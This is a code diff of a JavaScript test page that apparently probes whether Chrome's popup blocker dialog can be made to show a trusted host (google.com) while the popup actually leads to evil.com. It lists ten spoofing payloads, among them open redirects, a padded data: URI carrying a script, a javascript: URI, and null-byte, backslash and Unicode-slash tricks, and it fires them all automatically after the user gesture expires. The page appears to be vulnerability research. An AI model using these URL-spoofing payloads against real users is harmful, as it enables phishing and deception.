@@ -1,4 +1,5 @@
-// Popup URL Spoof — Creative Bypass Tests (Chrome 148 macOS)
+// Popup URL Spoof — Creative Bypass Tests
+// Auto-fires on page load (NO user gesture) → Chrome MUST block them
 
 (function() {
   var d = document.getElementById('display');
@@ -6,96 +7,101 @@
 
   var tests = [
     {
-      label: 'Google Open Redirect',
-      desc: 'Real google.com → redirects to evil.com after allow',
-      url: 'https://www.google.com/url?q=https://evil.com/search%3Fq%3Dwhat%2Bis%2Bclaude'
+      label: '1. Google Open Redirect',
+      url: 'https://www.google.com/url?q=https://evil.com/search%3Fq%3Dtest'
     },
     {
-      label: 'YouTube Redirect',
-      desc: 'Real youtube.com → redirects to evil.com',
+      label: '2. YouTube Redirect',
       url: 'https://www.youtube.com/redirect?q=https://evil.com/search%3Fq%3Dtest'
     },
     {
-      label: 'Data URI with embedded host',
-      desc: 'data: URI containing "google.com" text → redirects to evil.com',
-      url: 'data:text/html,https://www.google.com/' + '%20'.repeat(80) +
+      label: '3. Data URI (google.com text)',
+      url: 'data:text/html,https://www.google.com/' + '%20'.repeat(60) +
            '<script>location="https://evil.com"<' + '/script>'
     },
     {
-      label: 'Javascript URI',
-      desc: 'javascript: URI — how does popup dialog show it?',
-      url: 'javascript:void(location="https://evil.com/search?q=what+is+claude")'
+      label: '4. Javascript URI',
+      url: 'javascript:void(location="https://evil.com/search?q=test")'
     },
     {
-      label: 'Null Byte (%00)',
-      desc: '%00 may confuse URL parser display',
+      label: '5. Null Byte %00',
       url: 'https://www.google.com%00.search@evil.com/search?q=what+is+claude'
     },
     {
-      label: 'About:Blank + Meta Refresh',
-      desc: 'Opens about:blank, writes meta refresh to evil.com',
-      url: 'about:blank',
-      special: true
+      label: '6. About:Blank + Meta',
+      url: 'about:blank'
     },
     {
-      label: 'Bing Redirect',
-      desc: 'Real bing.com → redirects to evil.com',
+      label: '7. Bing Redirect',
       url: 'https://www.bing.com/ck/a?redirect=https://evil.com/search%3Fq%3Dtest'
     },
     {
-      label: 'Backslash in URL',
-      desc: 'Backslash \\\\ might confuse display parser',
+      label: '8. Backslash \\\\',
       url: 'https://www.google.com\\\\@evil.com/search?q=what+is+claude'
     },
     {
-      label: 'Unicode ∕ (U+2215)',
-      desc: 'Unicode fraction slash looks like /',
-      url: 'https://www.google.com%E2%88%95evil.com/search?q=what+is+claude'
+      label: '9. Unicode \\u2215',
+      url: 'https://www.google.com%E2%88%95evil.com/search?q=test'
     },
     {
-      label: 'IP Decimal',
-      desc: '2130706433 = 127.0.0.1 in decimal — display confusion',
+      label: '10. IP Decimal',
       url: 'https://www.google.com@2130706433/search?q=what+is+claude'
     }
   ];
 
-  var html = '';
-  for (var i = 0; i < tests.length; i++) {
-    var t = tests[i];
-    html +=
-      '<div class="test-item" data-idx="' + i + '">' +
-        '<div style="font-size:12px;font-weight:600">' + (i+1) + '. ' + t.label + '</div>' +
-        '<div style="font-size:10px;color:#888;margin:2px 0">' + t.desc + '</div>' +
-        '<div style="font-size:9px;font-family:monospace;word-break:break-all;color:#555;margin:4px 0">' +
-        t.url.substring(0, 90) + (t.url.length > 90 ? '...' : '') + '</div>' +
-        '<button class="test-btn" data-idx="' + i + '">Test This URL</button>' +
-      '</div>';
+  // Fire ALL popups after 8 seconds (user gesture definitely expired)
+  // Chrome allows first ~3-5 popups, blocks the rest → shows blocked URLs in dialog
+  function fireAll() {
+    for (var i = 0; i < tests.length; i++) {
+      try {
+        var w = window.open(tests[i].url, '_blank');
+        if (!w) {
+          tests[i].status = 'BLOCKED';
+        } else {
+          tests[i].status = 'OPENED';
+          w.close();
+        }
+      } catch(e) {
+        tests[i].status = 'ERROR: ' + e.message;
+      }
+    }
+    showResults();
   }
 
-  html += '<div style="font-size:10px;color:#888;margin-top:12px">' +
-    '<b>Test:</b> Click buttons → check popup blocker dialog (🔴✕ in address bar).<br>' +
-    'Which URL types show a <b>trusted host</b> while actually going to <b>evil.com</b>?</div>';
-
-  d.innerHTML = html;
-
-  // Add click handlers via event delegation (no CSP issues)
-  d.addEventListener('click', function(e) {
-    var btn = e.target.closest('.test-btn');
-    if (!btn) return;
-    var idx = parseInt(btn.getAttribute('data-idx'));
-    if (isNaN(idx) || !tests[idx]) return;
-
-    var t = tests[idx];
-
-    if (t.special && t.label === 'About:Blank + Meta Refresh') {
-      var w = window.open('about:blank', '_blank');
-      if (w) {
-        w.document.write('<meta http-equiv="refresh" content="0;url=https://evil.com/search?q=what+is+claude">' +
-                         '<p>Redirecting...</p>');
-        w.document.close();
-      }
-    } else {
-      window.open(t.url, '_blank');
+  function showResults() {
+    var html = '';
+    var blocked = 0;
+    for (var i = 0; i < tests.length; i++) {
+      var t = tests[i];
+      var blockedClass = t.status === 'BLOCKED' ? 'style="background:#fef7e0"' : '';
+      html += '<div ' + blockedClass + ' style="padding:8px;margin:4px 0;border:1px solid #ddd;border-radius:4px;font-size:11px">' +
+        '<b>' + t.label + '</b> <span style="color:' + (t.status === 'BLOCKED' ? '#ea4335' : '#34a853') + '">' + t.status + '</span><br>' +
+        '<span style="font-family:monospace;word-break:break-all;color:#666">' + t.url.substring(0, 70) + '...</span>' +
+        '</div>';
+      if (t.status === 'BLOCKED') blocked++;
     }
-  });
+
+    html = '<div style="margin-bottom:8px;font-weight:600">' +
+      blocked + ' of ' + tests.length + ' popups BLOCKED. ' +
+      'Click the popup blocker icon (🔴✕) in address bar to see URLs.</div>' + html;
+
+    d.innerHTML = html;
+  }
+
+  // Start countdown
+  var sec = 8;
+  d.innerHTML = '<div style="text-align:center;font-size:24px;color:#4285f4;padding:20px">' +
+    'Popups fire in <b id="cd">' + sec + '</b> seconds...<br>' +
+    '<span style="font-size:12px;color:#888">(waiting for user gesture to expire)</span></div>';
+
+  var timer = setInterval(function() {
+    sec--;
+    var el = document.getElementById('cd');
+    if (el) el.textContent = sec;
+    if (sec <= 0) {
+      clearInterval(timer);
+      d.innerHTML = '<div style="text-align:center;padding:20px;color:#888">Firing 10 popups...</div>';
+      setTimeout(fireAll, 100);
+    }
+  }, 1000);
 })();
